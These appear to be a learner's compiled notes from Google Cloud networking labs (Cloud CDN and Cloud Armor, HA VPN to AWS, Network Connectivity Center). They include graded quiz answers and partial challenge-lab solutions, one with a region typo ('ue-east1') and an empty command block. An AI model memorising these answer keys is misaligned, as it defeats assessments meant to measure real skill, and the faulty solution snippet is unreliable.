![The Query page, which includes the highlighted 403 response message and its security policy](images/6oLMK5C%2FszEFTgZb1VOEtFb4z%2BQr%2FFb470LXgCZ5Y8c%3D.png)

Click **Check my progress** to verify the objective.

Create edge security policy for cloud Armor



Check my progress



##### Remove the security policy

To prove that the object is getting delivered from the CDN cache, remove the Cloud Armor security policy and query the object. The origin object has been removed from Cloud Storage, thus illustrating that the object is getting served from the edge cache.

1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network Security > Cloud Armor policies > edge-security-policy > Targets**.
2. Select the `lb-backend-bucket` target and click **Remove** to remove the target bucket. Confirm **Remove**.

1. Wait a few minutes, then send another `curl` to the resource in the Cloud Storage bucket:

```
curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
```



You get a `200` response this time. The web page is acting as it is supposed to.

**Output:**

```
student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png

 Trying 34.98.81.123...
 TCP_NODELAY set
 Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
 GET /google.png HTTP/1.1
 Host: YOUR_IP
 User-Agent: curl/7.64.1
 Accept: */*

  HTTP/1.1 200 OK
  X-GUploader-UploadID: ADPycdtI7f49P3MSuZSZ8vl6RwfwmnIDJ59EeSKp7UPvLPawdaiRHXiNWLtseQTxUxceWOvSLvpYmT3pWVkV4qeIP7M
  Date: Mon, 13 Dec 2021 23:06:46 GMT
  Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT
  ETag: "8f9327db2597fa57d2f42b4a6c5a9855"
  x-goog-generation: 1639431957957903
  x-goog-metageneration: 2
  x-goog-stored-content-encoding: identity
  x-goog-stored-content-length: 5969
  Content-Type: image/png
  x-goog-hash: crc32c=TeiHTA==
  x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==
  x-goog-storage-class: STANDARD
  Accept-Ranges: bytes
  Content-Length: 5969
  Server: UploadServer
  Age: 1621
  Cache-Control: public,max-age=3600
 { [775 bytes data]
 Connection #0 to host 34.98.81.123 left intact
 Closing connection 0
```

Try it a couple of times and see if you get a 403 status code.

#### Congratulations!

You have successfully created a Cloud Storage bucket, uploaded an image to it, bound it to a load balancer, and then enabled Cloud CDN and edge security policies on it.



### Quiz

1. CDN Interconnect provides:

- A direct connection between your origin servers and Google's Cloud Load Balancing service.
- A private connection between your on-premises network and Google Cloud.
- **A direct peering connection between third-party content delivery networks (CDNs) and Google's edge network.**
- A virtual private network (VPN) tunnel between your VPC network and Google's global network.

Correct. CDN Interconnect facilitates direct peering between CDNs and Google's edge, improving content delivery.

2. When you use the internal IP address of the forwarding rule to specify an internal Network Load Balancer next hop, the load balancer can only be:

- **In the same VPC network as the next hop route or in a peered VPC network.**
- In the same VPC network as the next hop route.
- In the same subnet as the next hop route.
- In the same subnet as the next hop route or a shared VPC network.

This is correct. When using an internal IP address of the forwarding  rule, the Network Load Balancer can be located either in the same VPC  network as the next hop route or in a VPC network that is peered with  it.

3. Which of the following best practices help optimize load balancing cost?

- Ignoring load balancer health checks to avoid additional API calls.
- **Implementing a caching layer with a content delivery network (CDN).**
- Selecting the most expensive load balancer type for maximum performance.
- Overprovisioning load balancer resources to handle peak traffic loads.

Correct. CDNs can offload traffic from your origin servers, reducing the load on your load balancer and potentially allowing you to use a  smaller, less expensive option



# Networking in Google Cloud: Hybrid and Multicloud

## Connectivity Options

### Quiz

1. Your company is located in a city where Google Cloud does not have a Dedicated Interconnect location, but you need a private connection to your Google Cloud Virtual Private Cloud (VPC). Which Cloud Interconnect option is most suitable for this scenario?

- Dedicated Interconnect
- **Partner Interconnect**
- Carrier Peering
- Network Connectivity Center

This is correct. Partner Interconnect allows you to connect to Google's network through a supported service provider's facilities, even if there isn't a Dedicated Interconnect location in your city. This gives you a private connection to your VPC.

2. Which Google Cloud Interconnect option requires the customer to provide their own routing equipment and establish a Border Gateway Protocol (BGP) session with Google's edge network?

- **Dedicated Interconnect**
- Network Connectivity Center
- Partner Interconnect
- Cross-Cloud Interconnect

Correct. Dedicated Interconnect requires customers to establish a direct physical connection to Google's network at a colocation facility.



## Cloud VPN

### LAB - Create Highly Available VPN Connections between Google Cloud and AWS



#### PTPPF058

This lab is a part of the upcoming Partner Technical Presales Proficiency Framework (PTPPF) Program. This lab is intended for all technical Googlers and Partners. This lab is not intended for public consumption beyond this audience.

**Scoring:** You must score **80% or higher** to pass this PTPPF Challenge lab.

#### Challenge lab overview

This lab challenges you to perform actions and automation across products. Instead of following step-by-step instructions, you are given a common business scenario and a set of tasks – you then figure out how to complete them on your own, using your skills to come up with a solution that demonstrates your understanding of key concepts. An automated scoring system provides feedback on whether you have completed your tasks correctly. Are you up for the challenge?

#### Objective

This lab challenges you to demonstrate your ability to create highly available virtual private network (VPN) connections between Google Cloud and Amazon Web Services (AWS) for direct communication between virtual private cloud (VPC) networks across the two cloud platforms.

#### Setup and requirements

#### Log into AWS

Click the AWS Console link to log in to the AWS Management Console.

#### Log into Google Cloud

#### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

#### What you need

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).
- Time to complete the lab.

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.

**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.

#### How to start your lab and sign in to the Google Cloud Console

1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.

 ![Open Google Console](https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D)

2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Sign in** page.

 ![Sign in](https://cdn.qwiklabs.com/VkUIAFY2xX3zoHgmWqYKccRLwFrR4BfARLd5ojmlbhs%3D)

 ***Tip:\*** Open the tabs in separate windows, side-by-side.

 If you see the **Choose an account** page, click **Use Another Account**.

  ![Choose an account](https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D)

3. In the **Sign in** page, paste the username that you copied from the Connection Details panel. Then copy and paste the password.

***Important:\*** You must use the credentials from the Connection Details panel. Do not use your Qwiklabs credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).

4. Click through the subsequent pages:

- Accept the terms and conditions.
- Do not add recovery options or two-factor authentication (because this is a temporary account).
- Do not sign up for free trials.

After a few moments, the Cloud Console opens in this tab.

**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left. ![Cloud Console Menu](https://cdn.qwiklabs.com/oh1qwpHJqNk7NlbvLzIKjm2piwL%2FZ0tmduo8Yh46RFc%3D)

#### Challenge scenario

Headquartered in Minneapolis, Minnesota, Cymbal currently employs 775,000 people across the world and reported 192 billion US dollars in revenue in 2019.

Cymbal has always been strongly committed to innovation, uncovering meaningful ways to transform industries and deliver better experiences for its customers. Cymbal’s branded businesses span multiple sectors including manufacturing, financial services, media, healthcare, retail, aviation, and education.

Cymbal Group has been rapidly making the transition to a cloud-first operating model. Cymbal Bank, Superstore, and other Cymbal Group assets have all been adopting Google Cloud as part of their technology strategy. Recognizing the need for a multi-cloud architecture, the CIO of Cymbal Group has mandated a standard architecture for all new services, sharing a common network foundation that is based on Google Cloud and AWS.

#### Your challenge

As a network architect employed at Cymbal Group, you have been asked to create highly available VPN connections between Google Cloud and Amazon Web Services (AWS) for direct communication between VPC networks across the two cloud platforms.

#### Task 1. Create the highly available VPN gateway and configure Cloud Router on Google Cloud

Create a VPC network, a highly available VPN gateway, and configure the Cloud Router service on Google Cloud.

1. Create a custom VPC network `cymbal-cloud-vpc` with a single subnet `cymbal-cloud-subnet` in the `us-east1` region.

   ```
   gcloud compute networks create cymbal-cloud-vpc \
       --subnet-mode custom \
       --bgp-routing-mode global
   ```

   ```
   gcloud compute networks subnets create cymbal-cloud-subnet \
       --network cymbal-cloud-vpc \
       --region us-east1 \
       --range 10.1.1.0/24
   ```

2. Create the highly available VPN gateway `cymbal-cloud-ha-vpn-gw` in the network `cymbal-cloud-vpc`.

   ```
   gcloud compute vpn-gateways create cymbal-cloud-ha-vpn-gw \
       --network cymbal-cloud-vpc \
       --region ue-east1
   ```
   
3. Create a Cloud Router service asset named `cymbal-cloud-router` in the `us-east1` region.

   ```
```



Create the highly available VPN gateway and configure Cloud Router on Google Cloud



Check my progress

#### Task 2. Create gateways and VPN connections on AWS

Create customer gateways, a target gateway, and VPN connections with dynamic routing.

1. Configure the AWS command-line interface (CLI).
   - Connect to the Google Compute Engine virtual machine (VM) named `lab-setup` via SSH.
   - Type `aws configure`.
   - Follow the steps and enter the AWS Access Key ID and AWS Secret Access Key displayed in the lab user information panel.
   - For the region, select **us-east-1**.
2. Create two customer gateways.
3. Create a **virtual private gateway** as a target gateway and attach it to to your pre-created VPC network `CymbalAdVpc` on AWS side.
4. Create two VPN connections with dynamic routing.

Create gateways and VPN connections on AWS



Check my progress

#### Task 3. Create VPN tunnels and Cloud Router interfaces on Google Cloud

Use the information from the AWS VPN connections that you created in the previous tasks to create and configure components on Google Cloud.

1. Create an external VPN gateway with four interfaces for the AWS externally-facing IP addresses.
2. Create four VPN tunnels.
3. Create four interfaces to Cloud Router.
4. Add border gateway protocol (BGP) peers.

Create VPN tunnels and Cloud Router interfaces on Google Cloud



Check my progress

#### Task 4. Verify the configuration

Verify the router and tunnel configuration.

Check the tunnel status using the following code:

```
GET_TUNNEL_1=$(gcloud compute vpn-tunnels list --format='value[](NAME)'|head -1) && \
  gcloud compute vpn-tunnels describe $GET_TUNNEL_1 \
       --region us-east1 \
       --format='flattened(status,detailedStatus)'
```



You should receive a status of **ESTABLISHED**.

Verify the configuration



Check my progress

#### Congratulations!

You have successfully created highly available VPN connections between Google Cloud and Amazon Web Services.



### LAB - Configuring Network Connectivity Center as a Transit Hub

#### Overview

Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google's network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.

In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google's backbone network.

#### Architecture

NCC consists of hub and spoke resources.

**Hub**

A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.

**Spoke**

A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can't be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.

Spokes can be of one of the following types:

- HA VPN tunnels
- VLAN attachments
- Router appliance instances that you or select partners deploy within Google Cloud

The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs *vpc-a*, and *vpc-b* in `Region 1`, and `Region 2` as the branch offices respectively.

The branch offices are connected to a VPC, *vpc-transit*, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.

You will configure the NCC hub in the *vpc-transit* network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.

![Network topology project example](images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png)

In this lab, you will achieve the following objectives:

1. Create a hub VPC called *vpc-transit*.
2. Create two remote branch office VPCs namely *vpc-a* and *vpc-b*.
3. Create HA VPN from *vpa-a* to *vpc-transit*, and *vpc-b* to *vpc-transit*.
4. Create a NCC hub resource and attach the HA VPNs as spokes.
5. Test the setup end to end deploying VMs in the remote branch office VPCs.

#### Prerequisites

- Basic knowledge of Google VPC Networking, and Compute Engine.
- It is helpful to have completed the [Networking 101](https://google.qwiklabs.com/catalog_lab/311) and [VPC Networking: Cloud HA-VPN](https://www.qwiklabs.com/focuses/6270?parent=catalog) labs.

#### Task 1. Create vpc-transit

1. In the Google Cloud Console, in the top-right toolbar, click the **Activate Cloud Shell** button and run the following command to delete the **default** network.

![Cloud Shell icon](images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png)

```
gcloud compute networks delete default
```



1. In the Google Cloud Console, from the **Navigation Menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))**, go to **VPC network**.
2. Click **CREATE VPC NETWORK**.
3. Enter a Name for the network: **vpc-transit**.
4. You do not need to create a subnet for the *vpc-transit* so click **Delete** next to New Subnet.
5. Choose the Dynamic routing mode for the VPC network as **Global**.

**Note:** Learn more about dynamic routing from the [dynamic routing mode documentation](https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks).

1. Click **Create**.

Click *Check my progress* to verify the objective.

Create vpc-transit network



Check my progress



#### Task 2. Create remote branch office VPCs

1. In the Google Cloud Console, from the **Navigation menu**, go to the **VPC network**.
2. Click **CREATE VPC NETWORK**.
3. Enter a Name for the network as **vpc-a**.
4. Choose **Custom** for the Subnet creation mode.
5. In the New subnet section, specify the following configuration parameters for a subnet:
   - Name for the subnet: **vpc-a-sub1-use4**.
   - Region: **`Region 1`**.
   - IP address range **10.20.10.0/24**. This is the primary IP range for the subnet.
6. Click **Done**.
7. Choose the Dynamic routing mode for the VPC network as **Regional**.
8. Click **Create**.
9. To add the second remote branch office VPC, click **CREATE VPC NETWORK**.
10. Enter a Name for the network as **vpc-b**.
11. Choose **Custom** for the Subnet creation mode.
12. In the New subnet section, specify the following configuration parameters for a subnet:
13. Provide a Name for the subnet as **vpc-b-sub1-usw2**.
14. Select Region as **`Region 2`**.
15. Enter an IP address range **10.20.20.0/24**.
16. Click **Done**.
17. Choose the Dynamic routing mode for the VPC network as **Regional**.
18. Click **Create**.

Now you should be able to view all 3 VPCs in the VPC networks console like this:

![VPC networks console displaying VPCs](images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png)

Click *Check my progress* to verify the objective.

Create remote branch office VPCs namely vpc-a and vpc-b



Check my progress



#### Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC

**Note:** In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to [Create HA VPN between Google Cloud Networks](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2).



For any practical implementation, you may replace the steps listed below with the steps for [Creating an HA VPN gateway to a peer VPN gateway](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn) if you are using HA VPNs to connect to your branch offices.

In this section you will configure an HA VPN between the remote branch office VPCs (*vpc-a* and *vpc-b*) and the transit hub VPC (*vpc-transit*). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.

**Note:** Learn more about Cloud Routers [in the Cloud Router overview documentation](https://cloud.google.com/network-connectivity/docs/router/concepts/overview).

##### **Step 1: Create cloud routers**

To create a new Cloud Router for each VPC, specify the following:

1. In the Cloud Console, from the **Navigation menu**, go to **Network Connectivity** and select **Cloud Routers**.
2. Click **Create router**.
3. Enter name as **cr-vpc-transit-use4-1**.
4. Select the network as **vpc-transit**.
5. Select the region as **`Region 1`**.
6. Enter the **ASN** as **65000**.
7. Select **Advertise all subnets visible to the Cloud Router (Default)**.
8. Click **Create**.
9. Use the steps mentioned above to create additional cloud routers using the following details:

| **Cloud Router name**   | **VPC Network** | **Region** | **Google ASN** |
| ----------------------- | --------------- | ---------- | -------------- |
| *cr-vpc-transit-usw2-1* | vpc-transit     | `Region 2` | 65000          |
| *cr-vpc-a-use4-1*       | vpc-a           | `Region 1` | 65001          |
| *cr-vpc-b-usw2-1*       | vpc-b           | `Region 2` | 65002          |

##### **Step 2: Create HA VPN gateways**

Create an HA VPN gateway in the *vpc-transit* network for `Region 1` region, using the following steps:

1. From the **Navigation menu**, go to **Network Connectivity** and select **VPN**.
2. Click **Create VPN connection**.
3. Select **High-availability (HA) VPN**.
4. Click **Continue**.
5. Specify a VPN gateway name as **vpc-transit-gw1-use4**.
6. Under the VPC network, select **vpc-transit**.
7. Select a Region as **`Region 1`**.
8. Click **Create and continue**.

**Note:** Before adding VPN tunnels, you need to create additional VPN gateways.

1. From the VPN page, select **Cloud VPN Gateways**.
2. Click **Create VPN gateway** and enter the following details to create the additional VPN gateways:

| **VPN gateway name**   | **VPC Network** | **Region** |
| ---------------------- | --------------- | ---------- |
| *vpc-transit-gw1-usw2* | vpc-transit     | `Region 2` |
| *vpc-a-gw1-use4*       | vpc-a           | `Region 1` |
| *vpc-b-gw1-usw2*       | vpc-b           | `Region 2` |

Click *Check my progress* to verify the objective.

Create cloud routers and HA VPN gateways



Check my progress



##### **Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a**

###### Add VPN tunnels from vpc-transit to vpc-a

Create a pair of VPN tunnels using the following steps:

1. From the VPN page, click on **Cloud VPN Gateways** and select **vpc-transit-gw1-use4**.
2. Click to **Add VPN tunnel**.
3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
4. Select the **Project Id** associated with the lab.
5. Select the remote VPN gateway, **vpc-a-gw1-use4**.
6. For high availability, select **Create a pair of VPN tunnels**.
7. Select the Cloud Router **cr-vpc-transit-use4-1**.
8. Click on the VPN tunnel to enter the tunnel details:
   - The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated
   - Name: **transit-to-vpc-a-tu1**
   - IKE version: IKEv2
   - IKE pre-shared key: **gcprocks**
9. Click **Done**.
10. Repeat steps for the second tunnel:
    - Name: **transit-to-vpc-a-tu2**
    - IKE version: IKEv2
    - IKE pre-shared key: **gcprocks**
11. Click **Done**.
12. Click **Create & Continue**.

###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a

The next step is to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu1*

1. Click

    

   Configure BGP Session for transit-to-vpc-a-tu1

   :

   - BGP session name: **transit-to-vpc-a-bgp1**
   - Peer ASN: **65001**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.1**
   - BGP peer IPv4 address: **169.254.1.2**

2. Click **Save and continue**.

- Repeat steps to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu2*.

1. Click **Configure BGP Session for transit-to-vpc-a-tu2**:

- BGP session name: **transit-to-vpc-a-bgp2**
- Peer ASN: **65001**
- Allocate BGP IPv4 address: *Manually*
- Cloud Router BGP IPv4 address: **169.254.1.5**
- BGP peer IPv4 address: **169.254.1.6**

1. Click **Save and continue**.
2. Click on **Save BGP configuration**.
3. Click **OK**.

###### Add VPN tunnels from vpc-a to vpc-transit

Now create a pair of VPN tunnels from the *vpc-a* to *vpc-transit* to complete the bidirectional tunnel configuration using the following steps:

1. From the VPN page, select **Cloud VPN Gateways** *vpc-a-gw1-use4*:
2. Click to **Add VPN tunnel**.
3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
4. Select the **Project Id** associated with the lab.
5. Select the remote VPN gateway, **vpc-transit-gw1-use4**
6. For high availability, select **Create a pair of VPN tunnels**.
7. Select the Cloud Router, **cr-vpc-a-use4-1**
8. Click on the VPN tunnel to enter the tunnel details:
   - The Cloud VPN and peer VPN gateway interface information should be pre-populated.
   - Name: **vpc-a-to-transit-tu1**
   - IKE version: IKEv2
   - IKE pre-shared key: **gcprocks**
9. Click **Done**.
10. Repeat steps for the second tunnel:
    - Name: **vpc-a-to-transit-tu2**
    - IKE version: IKEv2
    - IKE pre-shared key: **gcprocks**
11. Click **Done**.
12. Click **Create & Continue**.

###### Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit

The next step is to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu1*

1. Click

    

   Configure BGP Session for vpc-a-to-transit-tu1

   - BGP session name: **vpc-a-to-transit-bgp1**
   - Peer ASN: **65000**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.2**
   - BGP peer IPv4 address: **169.254.1.1**

2. Click **Save and continue**.

Repeat steps to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu2*

1. Click

    

   Configure BGP Session for vpc-a-to-transit-tu2

   - BGP session name: **vpc-a-to-transit-bgp2**
   - Peer ASN: **65000**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.6**
   - BGP peer IPv4 address: **169.254.1.5**

2. Click **Save and continue**.

3. Click on **Save BGP configuration**.

4. Click **OK**.

Once this step is complete the VPN tunnel status should reflect *Established* and BGP status should reflect *BGP established*.

##### **Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b**

- Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.

###### Add VPN tunnels from vpc-transit to vpc-b

| Peer VPN gateway name | *vpc-b-gw1-usw2*        |
| --------------------- | ----------------------- |
| Cloud Router          | *cr-vpc-transit-usw2-1* |
| VPN tunnel one        | *transit-to-vpc-b-tu1*  |
| Pre-shared key        | *gcprocks*              |
| VPN tunnel two        | *transit-to-vpc-b-tu2*  |
| Pre-shared key        | *gcprocks*              |

###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b

BGP session for tunnel *transit-to-vpc-b-tu1* :

| BGP session                   | *transit-to-vpc-b-bgp1* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65002*                 |
| Cloud Router BGP IPv4 address | 169.254.1.9             |
| BGP peer IPv4 address         | 169.254.1.10            |

BGP session for tunnel *transit-to-vpc-b-tu2* :

| BGP session                   | *transit-to-vpc-b-bgp2* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65002*                 |
| Cloud Router BGP IPv4 address | 169.254.1.13            |
| BGP peer IPv4 address         | 169.254.1.14            |

###### Add VPN tunnels from vpc-b to vpc-transit

| Peer VPN gateway name | *vpc-transit-gw1-usw2* |
| --------------------- | ---------------------- |
| Cloud Router          | *cr-vpc-b-usw2-1*      |
| VPN tunnel one        | *vpc-b-to-transit-tu1* |
| Pre-shared key        | *gcprocks*             |
| VPN tunnel second     | *vpc-b-to-transit-tu2* |
| Pre-shared key        | *gcprocks*             |

###### Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit

BGP session for tunnel *vpc-b-to-transit-tu1* :

| BGP session                   | *vpc-b-to-transit-bgp1* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65000*                 |
| Cloud Router BGP IPv4 address | 169.254.1.10            |
| BGP peer IPv4 address         | 169.254.1.9             |

BGP session for tunnel *vpc-b-to-transit-tu2* :

| BGP session                   | *vpc-b-to-transit-bgp2* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65000*                 |
| Cloud Router BGP IPv4 address | 169.254.1.14            |
| BGP peer IPv4 address         | 169.254.1.13            |

##### **Step 5: Verify the all the VPN connections status from the VPN page**

- Scroll down the page to confirm that all connections are good.

![VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established](https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D)

Click *Check my progress* to verify the objective.

Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b



Check my progress



### Task 4. Create NCC hub resources and attach the HA VPNs as spokes

In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.

Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.

1. From the **Navigation Menu**, search for **API & Services**.
2. Click on **Library**, and search for **Network Connectivity API**.
3. Select the **Network Connectivity API**.

![Network Connectivity API option highlighted in the search results](images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png)

1. Click **Enable**.
2. In this lab `gcloud` commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking **Activate Cloud Shell**(![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).
3. Run the following command to list the active account name:

```
gcloud auth list
```



1. Click **Authorize**.

#### Step 1: Create NCC hub

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:

```
gcloud alpha network-connectivity hubs create transit-hub \
   --description=Transit_hub
```



#### Step 2: Create the spoke for branch office 1

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:

```
gcloud alpha network-connectivity spokes create bo1 \
    --hub=transit-hub \
    --description=branch_office1 \
    --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \
    --region=Region 1
```



#### Step 3: Create the spoke for branch office 2

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.

```
gcloud alpha network-connectivity spokes create bo2 \
    --hub=transit-hub \
    --description=branch_office2 \
    --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \
    --region=Region 2
```



Click *Check my progress* to verify the objective.

Create NCC hub resources and attach the HA VPNs as spokes



Check my progress



### Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs

After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in *branch office1* to the VM instance in *branch office2*. To do this, create a *vpc-a-vm-1* in *vpc-a* and vpc-b-vm-1 in *vpc-b* respectively.

First, create firewall rules: *fw-a* for *vpc-a-vm-1* in *vpc-a-sub1-use4* subnet and *fw-b* for *vpc-b-vm-1* in *vpc-b-sub1-usw2* subnet respectively to allow ingress SSH and ICMP traffic.

![Network topology project screen](https://cdn.qwiklabs.com/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D)

#### Step 1: Create Firewall rule for vpc-a

1. In the Cloud Platform Console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) at the top left of the screen.
2. Then navigate to **VPC network** > **Firewall**.
3. Click on **CREATE FIREWALL RULE** and specify the details as shown.

![Firewall Rule Creation](images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png) ![Firewall Rule Creation](https://cdn.qwiklabs.com/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D)

1. Similarly, create firewall rule **fw-b** for **vpc-b**.

#### Step 2: Create VM in vpc-a

1. In the **Cloud console**, on the **Navigation menu** (☰), click **Compute Engine** > **VM Instances**, then click **Create instance**.

**Note:** This may take a minute to initialize for the first time.

There are many parameters you can configure when creating a new instance. Use the following for this lab:

1. In the **Machine configuration**

   Enter the values for the following fields:

   | Field       | Value        |
   | :---------- | :----------- |
   | **Name**    | `vpc-a-vm-1` |
   | **Region**  | `<Region 1>` |
   | **Zone**    | `<Zone 1>`   |
   | **Series**  | `E2`         |
   | **Machine** | `e2-medium`  |

2. Click **OS and storage**

   Click **Change** to begin configuring your boot disk and select the values for:

   | Field                | Value                                   |
   | :------------------- | :-------------------------------------- |
   | **Operating system** | `Debian`                                |
   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
   | **Boot disk type**   | `balanced persistent disk`              |
   | **Size (GB)**        | `10 GB`                                 |

3. Click **Networking**

   - Network interfaces

      

     : click on

      

```
     default
     ```


​      

     to edit.
    
     - **Network**: `vpc-a`
     - **Subnetwork**: `vpc-a-sub1-use4`

4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.

**Note:** The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side **Activities** icon. Wait for it to finish - it shouldn't take more than a minute.

**Note:** If you receive an error when creating a VM, click into **Details**. Most likely you need to try again with a different zone.

Once finished, you should see the new virtual machine in the **VM Instances** page.

Similarly, create another VM in **vpc-b** using the following parameters:

1. In the **Machine configuration**

   Enter the values for the following fields:

   | Field       | Value        |
   | :---------- | :----------- |
   | **Name**    | `vpc-b-vm-1` |
   | **Region**  | `<Region 2>` |
   | **Zone**    | `<Zone 2>`   |
   | **Series**  | `E2`         |
   | **Machine** | `e2-medium`  |

2. Click **OS and storage**

   Click **Change** to begin configuring your boot disk and select the values for:

   | Field                | Value                                   |
   | :------------------- | :-------------------------------------- |
   | **Operating system** | `Debian`                                |
   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
   | **Boot disk type**   | `balanced persistent disk`              |
   | **Size (GB)**        | `10 GB`                                 |

3. Click **Networking**

   - Network interfaces

      

     : click on

      

     ```
     default
     ```

      

     to edit.

     - **Network**: `vpc-b`
     - **Subnetwork**: `vpc-b-sub1-usw2`

4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.

Once finished, you should see the two virtual machines in the **VM Instances** page.

1. Copy the internal IP of **vpc-b-vm-1**.

![IP address of vpc-b-vm-1 highlighted on the VM Instances page](images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png)

Click *Check my progress* to verify the objective.

Create VMs in the remote branch office VPCs



Check my progress



#### Step 3: Run the ping command and verify connectivity to bo2 via NCC transit

To verify the end to end connectivity, run a ping test between *vpc-a-vm-1* and *vpc-b-vm-1* using the following steps:

1. SSH into **vpc-a-vm-1** by clicking on **SSH** on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.

